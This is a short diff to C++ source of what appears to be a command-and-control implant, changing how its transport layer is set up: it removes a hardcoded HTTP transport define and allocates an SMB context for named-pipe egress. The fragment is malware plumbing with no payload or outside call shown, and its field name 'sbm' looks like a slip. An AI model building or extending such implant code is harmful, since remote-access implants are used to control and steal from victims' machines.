@@ -109,7 +109,6 @@ namespace Implant {
 
         Ctx->transport.outbound_queue = nullptr;
 
-#define TRANSPORT_HTTP
 #ifdef TRANSPORT_HTTP
         Ctx->transport.http = S_CAST(_http_context*, x_malloc(sizeof(_http_context)));
 
@@ -146,7 +145,8 @@ namespace Implant {
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        Parser::ParserWcscpy(&parser, &Ctx->config.EgressPipename, nullptr);
+        Ctx->transport.sbm = R_CAST(_smb_context*, x_malloc(sizeof(_smb_context)));
+        Parser::ParserWcscpy(&parser, &Ctx->config.egress_pipe, nullptr);
 #endif
     defer:
         Parser::DestroyParser(&parser);
